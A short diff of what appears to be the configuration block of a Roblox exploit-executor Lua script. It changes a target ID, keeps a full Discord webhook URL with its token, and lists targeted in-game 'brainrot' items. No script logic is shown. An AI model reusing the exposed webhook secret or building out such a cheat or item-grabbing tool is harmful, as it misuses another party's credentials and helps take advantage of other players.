@@ -1,5 +1,5 @@
 -- [[ CONFIGURATION ]] --
-getgenv().TARGET_ID = 3730460616
+getgenv().TARGET_ID = 8549777843
 getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1478014439059095563/Bml_u15aHlQhUs-iZhoob0aUFSM_X9nBfK_GYIdkSPavoCqzXxMyAu6ayOkvj4sgO-rj"
 getgenv().TARGET_BRAINROTS = {
     ["Dragon Gingerini"] = true, ["Skibidi Toilet"] = true, ["Meowl"] = true,
